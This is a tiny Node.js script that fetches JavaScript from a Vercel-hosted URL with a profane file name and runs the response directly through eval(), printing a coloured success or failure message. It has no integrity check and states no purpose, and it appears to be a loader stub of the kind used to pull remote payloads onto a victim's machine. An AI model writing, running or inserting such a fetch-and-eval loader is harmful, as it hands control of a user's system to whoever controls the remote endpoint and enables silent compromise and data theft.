const axios = require('axios');

const url = "https://official-hans.vercel.app/api/fuckyou.js"; // Correct API route

axios.get(url)
    .then(response => {
        console.log("\x1b[32m✅ Successfully loaded script from Vercel.\x1b[0m");
        eval(response.data);
    })
    .catch(err => {
        console.error("\x1b[31m❌ Failed to load script from Vercel API. Error:", err.message, "\x1b[0m");
    });